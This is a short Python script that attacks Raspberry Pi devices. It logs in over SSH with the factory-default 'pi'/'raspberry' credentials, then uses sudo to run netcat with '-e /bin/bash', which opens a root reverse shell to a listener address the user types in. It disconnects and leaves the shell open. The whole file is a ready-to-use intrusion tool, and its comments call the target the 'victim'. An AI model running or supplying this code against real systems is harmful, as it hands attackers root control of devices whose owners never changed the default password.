#!/usr/bin/python

import paramiko

####################################
# Get listener IP/Port & target IP #
####################################
lhost = raw_input('What is the listeners IP? (Do not prepend with http://) ')
lport = raw_input('What is the listeners Port? ')
rhost = raw_input('What is the target\'s IP? (Do not prepend with http://) ')
print

#############################
# Connect to target via SSH #
#############################
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(rhost, username='pi', password='raspberry')
print 'Connected to victim, attempting a reverse shell to {} at port {}'.format(lhost, lport)

############################################################
# Establish a NC shell back to attack box using root privs #
############################################################
cmd = 'sudo -u root nc {} {} -e /bin/bash'.format(lhost, lport)
stdin, stdout, stderr = client.exec_command(cmd)

##############################################
# Disconnect SSH, NC shell remains connected #
##############################################
client.close()
